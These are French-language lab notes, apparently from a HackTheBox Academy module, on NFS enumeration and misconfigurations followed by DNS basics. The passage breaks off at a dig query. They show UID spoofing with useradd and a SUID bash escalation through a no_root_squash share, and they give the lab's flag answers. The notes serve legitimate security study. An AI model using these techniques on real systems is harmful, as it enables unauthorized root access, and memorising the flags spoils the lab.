> **Pour les débutants :** NFS permet d'accéder à des dossiers distants comme s'ils étaient sur votre propre machine, mais uniquement entre systèmes Linux/Unix.
{: .prompt-info}

**Différence fondamentale avec SMB :**
- **SMB** = Windows ↔ Windows (et Samba pour Linux)
- **NFS** = Linux ↔ Unix uniquement
- Les clients NFS **ne peuvent pas** communiquer directement avec des serveurs SMB

### Évolution des versions NFS

**Changement majeur d'authentification :**
- **NFSv3** : Authentification de la **machine cliente** uniquement
- **NFSv4** : Authentification de **l'utilisateur** (comme SMB)

**Tableau des versions que j'ai analysé :**

| Version | Caractéristiques | Transport |
|---------|------------------|-----------|
| **NFSv2** | Version historique, compatible largement | UDP uniquement |
| **NFSv3** | Taille de fichier variable, meilleur reporting d'erreurs | UDP/TCP |
| **NFSv4** | Kerberos, traverse les firewalls, ACLs, stateful | TCP/UDP port 2049 |
| **NFSv4.1** | pNFS (parallélisme), NFS multipathing, clustering | TCP/UDP port 2049 |

**Mon analyse stratégique :**

**NFSv4 apporte des améliorations majeures :**
- **Kerberos** : Authentification forte
- **Stateful protocol** : Le serveur garde une trace des connexions
- **Un seul port (2049)** : Simplifie la traversée de firewall
- **ACLs** : Contrôle d'accès granulaire
- **pNFS** : Accès parallèle distribué sur plusieurs serveurs

> NFSv4 utilise uniquement le port 2049, contrairement aux anciennes versions qui nécessitaient plusieurs ports via portmapper
{: .prompt-info}

### Architecture technique de NFS

#### Le protocole RPC sous-jacent

**Ce que j'ai compris :** NFS est basé sur **ONC-RPC (Open Network Computing Remote Procedure Call)**, aussi appelé SUN-RPC.

**Configuration réseau :**
- **Port RPC** : 111 (TCP/UDP) pour le portmapper
- **Port NFS** : 2049 (TCP/UDP) pour le service principal
- **Format de données** : XDR (External Data Representation) pour l'indépendance système

#### Authentification et autorisation - Le problème critique

**Mon observation :** NFS n'a **aucun mécanisme d'authentification intégré** !

**Comment ça fonctionne réellement :**
1. L'authentification est déléguée au protocole **RPC**
2. L'autorisation est basée sur les **UID/GID UNIX**
3. Le serveur fait confiance aux informations envoyées par le client

**Le problème majeur que j'ai identifié :**
- Le client et le serveur n'ont **pas besoin** d'avoir les mêmes mappings UID/GID
- Le serveur **ne vérifie pas** si l'UID/GID est légitime
- Un attaquant peut **usurper n'importe quel UID/GID**

> NFS avec authentification UID/GID doit UNIQUEMENT être utilisé dans des réseaux de confiance
{: .prompt-danger}

### Configuration par défaut de NFS

#### Le fichier /etc/exports

**Commande pour visualiser la configuration :**
```bash
cat /etc/exports
```

**Contenu par défaut découvert :**
```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

**Structure d'une entrée que j'ai comprise :**
```
/dossier/à/partager    hôte_ou_subnet(options)
```

#### Options de configuration standards

**Tableau des options principales :**

| Option | Description | Impact performance/sécurité |
|--------|-------------|------------------------------|
| `rw` | Lecture et écriture | Accès complet |
| `ro` | Lecture seule | Protection contre modification |
| `sync` | Transfert synchrone | Plus lent mais plus sûr |
| `async` | Transfert asynchrone | Plus rapide mais risque corruption |
| `secure` | Ports < 1024 uniquement | Seul root peut utiliser le service |
| `insecure` | Ports > 1024 autorisés | N'importe quel user peut se connecter |
| `no_subtree_check` | Désactive vérification sous-dossiers | Meilleure performance |
| `root_squash` | root devient anonymous | Protection contre root distant |

**Mon observation sur root_squash :**

Par défaut, cette option **convertit l'UID 0 (root)** en utilisateur anonyme. C'est une protection importante car elle empêche un root distant d'avoir un accès root sur le partage NFS.

### Création d'un partage NFS de test

#### Configuration et activation

**Mes commandes pour créer un partage :**
```bash
echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
systemctl restart nfs-kernel-server
exportfs
```

**Résultat de exportfs :**
```
/mnt/nfs        10.129.14.0/24
```

**Mon analyse de cette configuration :**
- **Dossier partagé** : `/mnt/nfs`
- **Subnet autorisé** : 10.129.14.0/24 (toutes les machines de ce réseau)
- **Options** : sync (sécurisé), no_subtree_check (performant)
- **Permissions implicites** : Lecture/écriture par défaut si non spécifié

> Tous les hôtes du réseau 10.129.14.0/24 peuvent monter ce partage et accéder aux fichiers
{: .prompt-warning}

### Options dangereuses de NFS

#### Configurations à haut risque

**Tableau des options critiques :**

| Option | Description | Risque de sécurité |
|--------|-------------|-------------------|
| `rw` | Lecture et écriture | Modification/suppression de fichiers |
| `insecure` | Ports > 1024 utilisés | N'importe quel user peut se connecter |
| `nohide` | Export de systèmes de fichiers imbriqués | Exposition de montages cachés |
| `no_root_squash` | root garde UID/GID 0 | **Accès root complet sur le partage** |

#### Focus sur no_root_squash - La vulnérabilité critique

**Mon analyse de no_root_squash :**

Avec cette option, un utilisateur **root sur la machine cliente** conserve les droits **root sur le serveur NFS**.

**Scénario d'exploitation que j'ai identifié :**
1. J'ai accès root sur ma machine d'attaque
2. Je monte le partage NFS avec `no_root_squash`
3. Je crée des fichiers qui appartiennent à root (UID 0)
4. Ces fichiers sont **exécutables en tant que root** sur le serveur

> no_root_squash = escalade de privilèges directe vers root sur le serveur
{: .prompt-danger}

#### L'option insecure expliquée

**Ce que j'ai compris sur les ports :**

**Comportement standard (secure) :**
- Seuls les ports **< 1024** peuvent être utilisés
- Les ports < 1024 nécessitent des privilèges **root**
- Garantit que seul root peut se connecter au service NFS

**Avec insecure :**
- Les ports **> 1024** sont autorisés
- N'importe quel utilisateur peut se connecter
- Aucune garantie que la connexion vient d'un processus privilégié

### Énumération NFS avec Nmap

#### Scan basique des ports NFS

**Ma commande de reconnaissance :**
```bash
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

**Résultat obtenu :**
```
PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      45837/tcp   mountd
|   100021  1,3,4      44629/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
```

**Mon analyse des services RPC découverts :**

| Programme RPC | Numéro | Port | Service | Fonction |
|---------------|--------|------|---------|----------|
| rpcbind | 100000 | 111 | Portmapper | Redirection vers les services RPC |
| nfs | 100003 | 2049 | NFS principal | Partage de fichiers |
| mountd | 100005 | 45837 | Mount daemon | Gestion des montages |
| nlockmgr | 100021 | 44629 | Lock manager | Verrouillage de fichiers |
| nfs_acl | 100227 | 2049 | NFS ACL | Gestion des ACLs |

**Mon observation :** Le script `rpcinfo` de Nmap liste **tous les services RPC** actifs avec leurs ports dynamiques.

#### Scan avec scripts NSE spécifiques NFS

**Ma commande avancée :**
```bash
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

**Résultat détaillé obtenu :**
```
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
```

**Mon analyse détaillée des résultats :**

**Script nfs-ls :**
- Liste le **contenu du partage** directement depuis Nmap
- Affiche les **permissions, UID/GID, taille, date**
- **Découverte critique** : `id_rsa` et `id_rsa.pub` (clés SSH !)

**Script nfs-showmount :**
- Partage : `/mnt/nfs`
- Accessible par : `10.129.14.0/24`

**Script nfs-statfs :**
- Espace total : ~30 GB
- Espace utilisé : ~8 GB
- Espace disponible : ~20 GB
- Utilisation : 29%

> Les scripts NSE NFS révèlent le contenu complet du partage, y compris les fichiers sensibles comme les clés SSH
{: .prompt-tip}

### Montage manuel d'un partage NFS

#### Lister les partages disponibles

**Ma commande avec showmount :**
```bash
showmount -e 10.129.14.128
```

**Résultat :**
```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

**Mon observation :** `showmount` interroge le **mount daemon (mountd)** sur le port dynamique découvert par rpcbind.

#### Monter le partage NFS localement

**Mes commandes de montage :**
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

**Résultat de l'arborescence :**
```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

**Mon analyse des options de montage :**
- `-t nfs` : Type de système de fichiers (NFS)
- `10.129.14.128:/` : Serveur et chemin (/ = racine exportée)
- `./target-NFS/` : Point de montage local
- `-o nolock` : Désactive le verrouillage de fichiers (utile si nlockmgr pose problème)

> Une fois monté, le partage NFS se comporte exactement comme un dossier local
{: .prompt-info}

### Analyse des permissions et propriétaires

#### Visualisation avec noms d'utilisateurs

**Ma commande :**
```bash
ls -l mnt/nfs/
```

**Résultat obtenu :**
```
total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

**Mon observation :** Les fichiers appartiennent aux utilisateurs `cry0l1t3` et `root`.

#### Visualisation avec UID/GID numériques

**Ma commande avec `-n` :**
```bash
ls -n mnt/nfs/
```

**Résultat obtenu :**
```
total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

**Mon analyse technique :**

| Fichier | UID | GID | Permissions | Accès possible ? |
|---------|-----|-----|-------------|------------------|
| cry0l1t3.priv | 1000 | 1000 | rw-r--r-- | Lecture pour tous, écriture si UID=1000 |
| backup.sh | 0 | 1000 | rw-r--r-- | Lecture pour tous, écriture uniquement si root |
| id_rsa | 0 | 0 | rw-r--r-- | Lecture pour tous, écriture si root uniquement |

### Exploitation : Usurpation d'UID/GID

#### Créer un utilisateur correspondant sur ma machine

**Ma technique d'exploitation :**

Pour accéder aux fichiers de `cry0l1t3` (UID 1000), je crée un utilisateur avec le **même UID** sur ma machine :
```bash
sudo useradd -u 1000 cry0l1t3
sudo su - cry0l1t3
```

**Maintenant, je peux :**
- Lire `cry0l1t3.priv`
- Modifier `cry0l1t3.priv`
- Accéder à tous les fichiers avec UID 1000

> NFS fait confiance aveuglément aux UID/GID envoyés par le client. Je peux usurper n'importe quelle identité !
{: .prompt-danger}

#### Limitation avec root_squash

**Ce que j'ai testé :**

Même en tant que **root sur ma machine**, je ne peux **pas modifier** `backup.sh` si l'option `root_squash` est active.

**Pourquoi ?**
- `root_squash` convertit mon UID 0 (root) en **UID 65534** (nobody/anonymous)
- Je perds mes privilèges root sur le partage NFS
- C'est une protection efficace contre l'escalade de privilèges

**Mais si `no_root_squash` est activé :**
- Mon UID 0 reste UID 0 sur le serveur
- Je peux créer, modifier, supprimer **n'importe quel fichier**
- Je peux même créer un **SUID shell** pour une escalade permanente

### Escalade de privilèges via NFS

#### Scénario d'exploitation SUID

**Ma technique d'escalade :**

1. **Contexte** : J'ai un accès SSH en tant qu'utilisateur limité
2. **Découverte** : Un partage NFS avec `no_root_squash` est monté
3. **Exploitation** : Je créé un shell SUID depuis ma machine root

**Commandes d'exploitation :**

Sur ma machine d'attaque (en tant que root) :
```bash
# Monter le partage NFS
sudo mount -t nfs 10.129.14.128:/mnt/nfs ./target-NFS/ -o nolock

# Créer une copie de bash avec SUID
sudo cp /bin/bash ./target-NFS/shell
sudo chmod +s ./target-NFS/shell
```

Sur le serveur cible (via SSH user limité) :
```bash
cd /mnt/nfs
./shell -p  # -p pour préserver les privilèges SUID
whoami
# root !
```

**Mon analyse de cette attaque :**
- Le fichier `shell` appartient à root (UID 0) grâce à `no_root_squash`
- Le bit SUID (`chmod +s`) permet d'exécuter avec les droits du propriétaire
- Quand je l'exécute depuis le serveur, je deviens **root**

> Cette technique fonctionne uniquement si no_root_squash est activé sur le partage NFS
{: .prompt-tip}

### Démontage du partage NFS

#### Nettoyer après énumération

**Ma commande finale :**
```bash
cd ..
sudo umount ./target-NFS
```

**Mon observation :** Toujours démonter proprement pour éviter des problèmes de verrouillage ou des fichiers corrompus.

### Ce que je retiens sur NFS

#### Vulnérabilités critiques identifiées

**Liste de vérification pour mes pentests :**

1. **Authentification UID/GID faible** → Usurpation d'identité triviale
2. **no_root_squash activé** → Escalade vers root immédiate
3. **insecure activé** → N'importe quel user peut se connecter
4. **Partages world-readable** → Fuite d'informations sensibles
5. **Clés SSH exposées** → Accès direct aux systèmes
6. **Scripts de backup accessibles** → Potentiel command injection

#### Méthodologie d'énumération NFS

**Mon workflow systématique :**

1. **Nmap basique** → Découverte ports 111 et 2049
2. **Nmap avec scripts NSE** → Contenu des partages, permissions
3. **showmount -e** → Liste des exports disponibles
4. **mount** → Montage local du partage
5. **ls -n** → Identification des UID/GID
6. **Usurpation UID/GID** → Création d'utilisateurs correspondants
7. **Test no_root_squash** → Tentative de création de fichiers root
8. **Recherche de fichiers sensibles** → Clés SSH, configs, scripts

#### Commandes essentielles

**Aide-mémoire que j'utilise :**
```bash
# Découverte
nmap -p111,2049 -sV -sC <target>
nmap --script nfs* -p111,2049 <target>

# Liste des exports
showmount -e <target>

# Montage
mkdir nfs-mount
mount -t nfs <target>:/<share> ./nfs-mount -o nolock

# Énumération
ls -la nfs-mount/
ls -n nfs-mount/  # Voir les UID/GID numériques

# Usurpation
useradd -u <UID> <username>
su - <username>

# Démontage
umount ./nfs-mount
```

#### Erreurs de configuration dangereuses

**Configurations que je cible en priorité :**

| Configuration | Impact | Exploitation |
|---------------|--------|--------------|
| `no_root_squash` | Root distant = root local | SUID shell, modification de fichiers root |
| `rw` sur partages sensibles | Modification de configs | Backdoor, persistence |
| `insecure` | Accès non-root autorisé | Énumération facilitée |
| `nohide` | Exposition de montages cachés | Découverte de données supplémentaires |
| Pas de restriction réseau | Accessible depuis Internet | Exposition publique |

> NFS doit être considéré comme non sécurisé par défaut et réservé aux réseaux de confiance isolés
{: .prompt-danger}

---

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**

Bon déjà commençons par voir ce qui se trouve sur les ports les plus connus pour NFT (`111 et 2049`) avec le bon vieux **nmap**

```bash
└──╼ [★]$ nmap -p111,2049 -sV -sC 10.129.94.226
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 05:50 CST
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 50.00% done; ETC: 05:50 (0:00:01 remaining)
Nmap scan report for 10.129.94.226
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33632/udp6  mountd
|   100005  1,2,3      35689/tcp6  mountd
|   100005  1,2,3      43821/tcp   mountd
|   100005  2,3        36055/udp   mountd
|   100021  1,3,4      34068/udp6  nlockmgr
|   100021  1,3,4      37461/tcp   nlockmgr
|   100021  1,3,4      40470/udp   nlockmgr
|   100021  1,3,4      41937/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```

Nous pouvons voir qu'il y a plein de ports ouvert maintenant scannons avec les `script nfs` de nmap

```bash
└──╼ [★]$ nmap --script nfs* -p111,2049 10.129.94.226
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 05:52 CST
Nmap scan report for 10.129.94.226
Host is up (0.043s latency).

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-statfs: 
|   Filesystem     1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|   /var/nfs       4062912.0  3422544.0  414272.0   90%   16.0T        32000
|_  /mnt/nfsshare  4062912.0  3422544.0  414272.0   90%   16.0T        32000
| nfs-ls: Volume /var/nfs
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxr-xr-x   65534  65534  4096  2021-11-08T15:08:27  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   65534  65534  39    2021-11-08T15:08:27  flag.txt
| 
| 
| Volume /mnt/nfsshare
|   access: Read Lookup Modify Extend Delete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxr-xr-x   65534  65534  4096  2021-11-08T14:06:40  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   65534  65534  59    2021-11-08T14:06:40  flag.txt
|_
| nfs-showmount: 
|   /var/nfs 10.0.0.0/8
|_  /mnt/nfsshare 10.0.0.0/8
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
```

Bien nous avons toute les infos qu'il nous fallait pour aller chercher le flag.txt qui se trouve dans `/mnt/nfsshare/flag.txt` essayons de nous connecter de ce pas:

Mais nous avons besoin de connaitre les dossiers partagé sur notre cible pour pouvoir les "clonner" après et nous utilisons la commande `showmount -e`
```bash
└──╼ [★]$ showmount -e 10.129.94.226
Export list for 10.129.94.226:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

Dans un premier temps nous devons créer sur notre machine un dossier pour pouvoir y "clonner" le répertoire nfs de la cible
```bash
mkdir nfs-mount
```

Ensuite nous devons y mettre le dossier partagé de la cible sur notre machine avec la commande `mount` comme vu précédemment
```bash
└──╼ [★]$ sudo mount -t nfs 10.129.94.226:/var/nfsshare ./nfs-mount -o nolock
mount.nfs: access denied by server while mounting 10.129.94.226:/var/nfsshare
```

Donc j'ai essayé de monter le dossier partagé `nfsshare` mais je n'avais pas les droits donc j'ai essayé sur le dossier `nfs`

```bash
└──╼ [★]$ sudo mount -t nfs 10.129.94.226:/var/nfs ./nfs-mount -o nolock
┌─[eu-academy-3]─[10.10.14.186]─[htb-ac-1999270@htb-red6um1fvq]─[~]
└──╼ [★]$ ls
cacert.der  Documents  Music      Pictures  Templates
Desktop     Downloads  nfs-mount  Public    Videos
```

Comme nous pouvons le voir le dossier c'est bien créer et quand on va dedans on peut faire un `ls -l` et `ls -n` pour voir les permissions du fichier **flag.txt** pour voir qui peut l'ouvrir:

```bash
└──╼ [★]$ ls -l
total 4
-rw-r--r-- 1 nobody nogroup 39 Nov  8  2021 flag.txt
┌─[eu-academy-3]─[10.10.14.186]─[htb-ac-1999270@htb-red6um1fvq]─[~/nfs-mount]
└──╼ [★]$ ls -n
total 4
-rw-r--r-- 1 65534 65534 39 Nov  8  2021 flag.txt
```

Donc ce fichier n'a pas de group et pas un UID spécifique donc nous pouvons le `cat` sans problèmes

> Bien penser a `umount` le dossier pour ne pas avoir de problème de corruption ou autre
{: .prompt-warning}

**Réponse :** `HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}`

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**

Maintenant nous devons aller chercher l'autre flag qui se trouve dans `/mnt/nfsshare` mais nous avons vu que nous n'avons pas le droit de le monter

Alors après réfléxion je me suis trompé car regardez la commande que je faisais:

```bash
sudo mount -t nfs 10.129.94.226:/var/nfsshare ~/nfs-mount -o nolock
```

J'essayé de monter le dossier `/var/nfsshare` sauf que on a vu que il n'y a que deux dossiers partagés et les voici:

```bash
└──╼ [★]$ showmount -e 10.129.94.226
Export list for 10.129.94.226:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

Donc le premier étais bien `/var/nfs` mais l'autre commençais pas pas `/var` mais par `/mnt` ça explique tout

> Les erreurs d'innatention peuvent facilement nous faire changer le piste faut faire attention
{: .prompt-danger}

```bash
sudo mount -t nfs 10.129.94.226:/mnt/nfsshare ~/nfs-mount -o nolock
```

Une fois la bonne commande exécuté on peut aller voir comment ouvrir le **flag.txt**

```bash
└──╼ [★]$ ls -n
total 4
-rw-r--r-- 1 65534 65534 59 Nov  8  2021 flag.txt
┌─[eu-academy-3]─[10.10.14.186]─[htb-ac-1999270@htb-red6um1fvq]─[~/nfs-mount]
└──╼ [★]$ ls -l
total 4
-rw-r--r-- 1 nobody nogroup 59 Nov  8  2021 flag.txt
```

Aucuns group ni rien nous pouvons de nouveau `cat` le fichier sans problèmes

**Réponse :** `HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}`

---

## DNS (Domain Name System)

### Comprendre le rôle du DNS

**DNS (Domain Name System)** est le système qui traduit les noms de domaine (comme `academy.hackthebox.com`) en adresses IP. C'est l'annuaire téléphonique d'Internet.

> **Pour les débutants :** Sans DNS, vous devriez mémoriser des adresses IP comme `185.199.108.153` au lieu de simplement taper `google.com` dans votre navigateur.
{: .prompt-info}

**Caractéristique importante :** Le DNS n'a **pas de base de données centralisée**. Les informations sont distribuées sur des milliers de serveurs DNS à travers le monde.

### Types de serveurs DNS

**Tableau des différents rôles DNS :**

| Type de serveur | Rôle | Importance en pentest |
|----------------|------|----------------------|
| **DNS Root Server** | Gère les TLD (.com, .net, .org) | 13 serveurs racine gérés par ICANN |
| **Authoritative Nameserver** | Autorité pour une zone spécifique | Contient les enregistrements réels du domaine |
| **Non-authoritative Nameserver** | Collecte les infos par requêtes récursives | Cache les réponses d'autres serveurs |
| **Caching DNS Server** | Met en cache les réponses | Accélère les résolutions futures |
| **Forwarding Server** | Transfère les requêtes à un autre DNS | Simplifie l'architecture |
| **Resolver** | Résolution locale | Sur votre ordinateur ou routeur |

**Mon observation sur les serveurs autoritaires :** Ils détiennent la **vérité** pour une zone DNS. Quand je les interroge directement, j'obtiens les informations les plus fiables et complètes.

### Sécurité et chiffrement DNS

**Le problème de sécurité que j'ai identifié :** Par défaut, le DNS est **non chiffré**. Toute personne sur le réseau local ou le FAI peut espionner mes requêtes DNS.

**Solutions de chiffrement modernes :**
- **DoT (DNS over TLS)** : Chiffrement via TLS sur le port 853
- **DoH (DNS over HTTPS)** : DNS tunnelé dans HTTPS sur le port 443
- **DNSCrypt** : Protocole de chiffrement entre client et serveur DNS

> En pentest, le DNS non chiffré est une aubaine : je peux intercepter et analyser toutes les résolutions de noms
{: .prompt-tip}

### Hiérarchie DNS et structure des domaines

#### Organisation hiérarchique

**Structure que j'ai analysée :**
```
Root (.)
├── TLD: .com, .net, .org, .dev, .io
│   └── Second Level Domain: inlanefreight.com
│       └── Subdomains: dev.inlanefreight.com
│           www.inlanefreight.com
│           mail.inlanefreight.com
│               └── Host: WS01.dev.inlanefreight.com
```

**Mon observation :** Chaque niveau ajoute un point dans le FQDN (Fully Qualified Domain Name). Plus on descend dans la hiérarchie, plus on obtient d'informations spécifiques.

### Types d'enregistrements DNS

#### Les enregistrements essentiels

**Tableau des records DNS critiques :**

| Record | Fonction | Information révélée | Usage en pentest |
|--------|----------|---------------------|------------------|
| **A** | IPv4 du domaine | Adresse du serveur web | Cible pour scan de ports |
| **AAAA** | IPv6 du domaine | Adresse IPv6 | Souvent oubliée dans les firewalls |
| **MX** | Serveurs mail | Infrastructure email | Cibles pour phishing, spam |
| **NS** | Serveurs DNS autoritaires | Nameservers du domaine | Cibles pour zone transfer |
| **TXT** | Informations diverses | SPF, DMARC, validations | Révèle services tiers (Google, Mailgun) |
| **CNAME** | Alias vers autre domaine | Redirections | Découverte de sous-domaines cachés |
| **PTR** | Résolution inverse (IP → nom) | Noms d'hôtes réels | Énumération de réseaux |
| **SOA** | Autorité de la zone | Admin email, serveur primaire | Infos sur la gestion DNS |

#### Focus sur l'enregistrement SOA

**Ma commande pour interroger un SOA :**
```bash
dig soa www.inlanefreight.com
```

**Résultat obtenu :**
```
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400
```

**Décodage de cet enregistrement :**
- **Serveur primaire** : `ns-161.awsdns-20.com`
- **Email admin** : `awsdns-hostmaster@amazon.com` (le point est remplacé par @)
- **Serial** : 1
- **Refresh** : 7200 secondes (2 heures)
- **Retry** : 900 secondes (15 minutes)
- **Expire** : 1209600 secondes (14 jours)
- **TTL minimum** : 86400 secondes (1 jour)

> L'email de l'administrateur DNS est une information précieuse pour du phishing ciblé
{: .prompt-tip}

### Configuration d'un serveur DNS - BIND9

#### Fichiers de configuration principaux

**Sur Linux avec BIND9, trois types de fichiers :**

1. **Fichiers de configuration locaux** : Paramètres généraux
2. **Zone files** : Enregistrements DNS pour chaque domaine
3. **Reverse name resolution files** : Résolution inverse (IP → nom)

**Fichiers de configuration BIND9 :**
- `named.conf.local` : Zones locales
- `named.conf.options` : Options globales
- `named.conf.log` : Configuration des logs

#### Configuration locale - named.conf.local

**Exemple de configuration que j'ai analysé :**
```bash
cat /etc/bind/named.conf.local
```

**Contenu :**
```
zone "domain.com" {
    type master;
    file "/etc/bind/db.domain.com";
    allow-update { key rndc-key; };
};
```

**Mon analyse :**
- **type master** : Ce serveur est autoritaire pour cette zone
- **file** : Chemin vers le zone file
- **allow-update** : Seule la clé `rndc-key` peut mettre à jour la zone (sécurité)

#### Zone File - db.domain.com

**Contenu d'un zone file typique :**
```bash
cat /etc/bind/db.domain.com
```

**Résultat :**
```
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.

             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
```

**Mon analyse détaillée :**

**Section SOA :**
- **Serial** : Numéro de version (incrémenté à chaque modification)
- **Refresh** : Fréquence de vérification par les secondaires
- **Retry** : Délai avant nouvelle tentative si échec
- **Expire** : Durée avant expiration des données si master injoignable

**Enregistrements NS :**
- Deux nameservers : `ns1` et `ns2` (redondance)

**Enregistrements MX :**
- Priorité 10 pour `mx.domain.com` (principal)
- Priorité 20 pour `mx2.domain.com` (backup)

**Enregistrements CNAME :**
- `www` pointe vers `server2`
- `ftp` pointe vers `server1`
- Les MX sont aussi des alias

> Les CNAME révèlent l'architecture : plusieurs services peuvent pointer vers le même serveur
{: .prompt-info}

#### Fichier de résolution inverse (PTR)

**Configuration PTR :**
```bash
cat /etc/bind/db.10.129.14
```

**Contenu :**
```
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
```

**Mon observation sur in-addr.arpa :**

La notation est **inversée** : `10.129.14.5` devient `5.14.129.10.in-addr.arpa`

**Pourquoi c'est utile en pentest :**
- Résolution inverse révèle les **vrais noms d'hôtes**
- Permet de découvrir des serveurs internes
- Les PTR sont souvent oubliés dans les configurations

### Options DNS dangereuses

#### Configurations à haut risque

**Tableau des options critiques :**

| Option | Fonction | Risque de sécurité |
|--------|----------|-------------------|
| `allow-query` | Définit qui peut interroger le DNS | `any` = tout le monde peut interroger |
| `allow-recursion` | Autorise les requêtes récursives | `any` = amplification DDoS possible |
| `allow-transfer` | Autorise les zone transfers | `any` = fuite complète de la zone DNS |
| `zone-statistics` | Collecte des statistiques | Révèle les patterns de requêtes |

**Mon analyse du risque allow-transfer :**

Si configuré avec `any` ou un subnet trop large :
- N'importe qui peut télécharger **toute la zone DNS**
- Révélation de **tous les sous-domaines** (même internes)
- Exposition des **IPs internes** et de l'architecture

> allow-transfer mal configuré = carte complète de l'infrastructure en une seule requête
{: .prompt-danger}

### Énumération DNS avec DIG

#### Requête des nameservers (NS)

**Ma commande :**
```bash
dig ns inlanefreight.htb @10.129.14.128
```

**Résultat obtenu :**
```
;; ANSWER SECTION:
